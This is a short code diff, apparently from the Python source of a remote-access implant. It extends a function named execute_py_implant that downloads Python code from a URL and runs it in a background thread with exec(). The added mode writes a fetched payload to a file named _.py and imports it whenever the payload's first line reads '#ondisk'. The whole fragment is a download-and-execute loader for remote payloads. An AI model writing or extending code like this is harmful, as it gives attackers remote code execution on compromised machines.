@@ -17,14 +17,25 @@ def exec_py():
     global payload
     exec(payload)
 
+def ondisk_py():
+    global payload
+    with open("_.py",'w') as file:
+        file.write(payload)
+    from _ import *
+    return ""
+
 def execute_py_implant(url,session):
     response = session.get(url,headers={'Cache-Control': 'no-cache',"Pragma": "no-cache"})
     if response.status_code == 200:
         global payload
         payload = response.text
+        if payload.split("\n")[0]=="#ondisk":
+            target = ondisk_py
+        else:
+            target = exec_py
         try:
             global th_list
-            th = threading.Thread(target=exec_py)
+            th = threading.Thread(target=target)
             th_list.append(th)
             th.start()
         except:
